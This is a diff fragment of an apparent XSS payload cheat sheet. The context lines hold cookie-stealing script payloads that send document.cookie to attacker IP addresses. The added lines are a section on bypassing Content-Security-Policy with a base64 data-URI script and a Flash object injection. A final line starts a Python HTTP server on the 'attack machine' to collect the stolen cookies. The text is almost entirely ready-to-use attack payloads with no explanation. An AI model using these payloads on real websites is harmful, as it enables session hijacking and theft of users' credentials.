@@ -24,5 +24,16 @@ i.src="http://192.168.0.18:8888/?"+document.cookie;
 
 <script>img = new Image(); img.src = "http://192.168.1.44/a.php?"+document.cookie;</script>
 
+==============================================================================
+[+] Bypass Content-security-policy header XSS
+==============================================================================
+
+<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
+
+<object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
+<param name="AllowScriptAccess" value="always"></object>
+
+
+
 # Attack Machine
 sudo python -m SimpleHTTPServer 80
